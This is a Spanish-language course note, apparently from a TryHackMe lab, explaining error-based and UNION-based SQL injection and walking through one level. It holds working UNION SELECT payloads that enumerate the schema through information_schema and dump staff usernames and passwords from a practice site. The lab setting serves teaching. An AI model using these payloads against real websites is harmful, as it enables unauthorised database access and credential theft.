---
layout: apunte
title: "5. In-Band SQLI"
---

La SQLi In-Band es el tipo más fácil de detectar y explotar. Se refiere al mismo método de comunicación para explotar la vulnerabilidad y recibir los resultados, por ejemplo, descubrir una vulnerabilidad de inyección SQL en un sitio web y ser capaz de extraer información de la base de datos en la propia página.

---------------------------
<h2>SQLi Basada en Errores</h2>
Este tipo es la más útil para obtener información sobre la estructura de la base de datos, ya que los errores de la base de datos se imprimen en el navegador directamente. Puede ser usado para enumerar una base de datos entera.

La clave para descubrirlas es romper el código SQL probando caracteres especiales hasta que salga un mensaje de error. Normalmente se hace con `'` o `"`.

-------------------------------------
<h2>SQLi Basada en Unión</h2>
Este tipo de inyección usa el operador SQL "UNION" junto a SELECT para devolver resultados adicionales a la página. Este método es la forma más común de extraer grandes cantidades de información vía SQLi.

----------------------------------
<h2>Práctica</h2>
Vamos a ver algunos ejemplos prácticos.

-------------------------------
<h2>Nivel 1</h2>

!**Pasted image 20251114100228.png**

Probamos a meter una comilla simple. Esto nos devuelve un error:

!**Pasted image 20251114100410.png**

Esto deja constancia de que hay una vulnerabilidad SQLi y ahora toca explotarla. Intentaremos que nos devuelva información usando el operador UNION: `1 UNION SELECT 1`

!**Pasted image 20251114100748.png**

Añadimos otra columna:

!**Pasted image 20251114100828.png**

Y así hasta que acertemos:

!**Pasted image 20251114100950.png**

La query nos devuelve el artículo porque es lo primero con lo que se encuentra (`id=1`), pero si modificamos la query para que muestre un artículo que no existe (`id=0`) entonces nos mostrará nuestra información.

!**Pasted image 20251114101443.png**

Podemos ver que el 1, el 2 y el 3 aparecen en el resultado. Si cambiamos alguno de esos números por un término existente nos devolverá ese término en el sitio que le corresponde, por ejemplo el 3: `https://website.thm/article?id=0 UNION SELECT 1,2,database()`

!**Pasted image 20251114101607.png**

Ahora que sabemos el nombre de la base de datos (**sqli_one**), toca obtener el nombre de las tablas. Para ello vamos a usar la siguiente query: `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`

!**Pasted image 20251114101909.png**

>[!TIP] Si no entiendes las sentencias revisa [0. SQL Fundamentals](/apuntes/thm/0-pre-career/2-cyber-security-101/8-web-hacking/3-sql-fundamentals/0-sql-fundamentals/) y estudia SQL, es la mejor manera de entenderlo todo.

Como nos interesa descubrir la contraseña de Martin vamos a buscar en **staff_users** que significa usuarios del equipo.

Volvemos a utilizar **information_schema** pero ahora con **columns** y en group_concat() metemos **column_name** en lugar de **table_name**.

`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`

!**Pasted image 20251114102247.png**

Ahora toca obtener los datos que nos interesan:

`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`

!**Pasted image 20251114102519.png**

Habiendo obtenido la contraseña de Martin nos movemos hacia el siguiente nivel y obtenemos la flag.

!**Pasted image 20251114102643.png**
